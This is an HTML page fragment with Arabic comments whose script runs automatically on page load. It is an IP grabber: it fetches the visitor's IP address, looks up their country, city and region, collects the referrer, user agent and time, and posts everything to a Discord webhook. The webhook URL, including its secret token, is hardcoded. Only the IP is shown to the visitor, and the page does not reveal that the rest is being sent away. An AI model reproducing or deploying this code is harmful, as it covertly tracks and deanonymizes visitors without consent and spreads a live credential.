              <title>معلومات الزائر</title>
              <script>
                  // دالة لجمع وإرسال بيانات الزائر إلى Discord Webhook
                  async function sendVisitorInfo() {
                      try {
                          // جلب عنوان الـ IP من خدمة ipify
                          const ipResponse = await fetch('https://api.ipify.org?format=json');
                          const ipData = await ipResponse.json();
                          const ip = ipData.ip;
          
                          // جلب معلومات الموقع بناءً على عنوان الـ IP من خدمة ipinfo
                          const ipInfoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
                          const ipInfoData = await ipInfoResponse.json();
          
                          // الحصول على معلومات المتصفح وموقع الإحالة
                          const referrer = document.referrer || "مباشرة";  // إذا لم يكن هناك رابط إحالة
                          const userAgent = navigator.userAgent;
                          const dateTime = new Date().toLocaleString(); // تاريخ ووقت الدخول
          
                          // إعداد رابط الـ Webhook الخاص بك
                          const webhookUrl = 'https://canary.discord.com/api/webhooks/1317966197794410536/mC90wgN-yTSfdmrE3fDX0BTCCkNb8mjg1mqKqGg9kTD0h-BYlhGdw0tofZaEFK42WD2C'; // استبدل YOUR_WEBHOOK_URL برابط الويب هوك الخاص بك
          
                          // إرسال البيانات إلى Discord Webhook
                          await fetch(webhookUrl, {
                              method: 'POST',
                              headers: {'Content-Type': 'application/json'},
                              body: JSON.stringify({
                                  content: "**New visitor information**", // العنوان الأساسي
                                  embeds: [
                                      {
                                          title: "Visitor Details", // عنوان الرسالة في Discord
                                          fields: [
                                              { name: "IP Address", value: ip, inline: true },  // عرض عنوان الـ IP
                                              { name: "Country", value: ipInfoData.country, inline: true }, // عرض الدولة
                                              { name: "City", value: ipInfoData.city || "Unknown", inline: true }, // عرض المدينة
                                              { name: "Region", value: ipInfoData.region || "Unknown", inline: true }, // عرض المنطقة
                                              { name: "Referrer", value: referrer, inline: false },  // رابط الإحالة
                                              { name: "User Agent", value: userAgent, inline: false }, // معلومات المتصفح
                                              { name: "Date & Time", value: dateTime, inline: false }  // تاريخ ووقت الدخول
                                          ],
                                          color: 3066993 // لون (اختياري)
                                      }
                                  ]
                              })
                          });
          
                          // عرض عنوان الـ IP على الصفحة (اختياري)
                          document.getElementById('ip-address').textContent = `Your IP: ${ip}`;
          
                      } catch (error) {
                          console.error('Error fetching visitor information:', error);
                      }
                  }
          
                  // عند تحميل الصفحة يتم استدعاء الدالة
                  window.onload = function() {
                      sendVisitorInfo();
                  };
              </script>
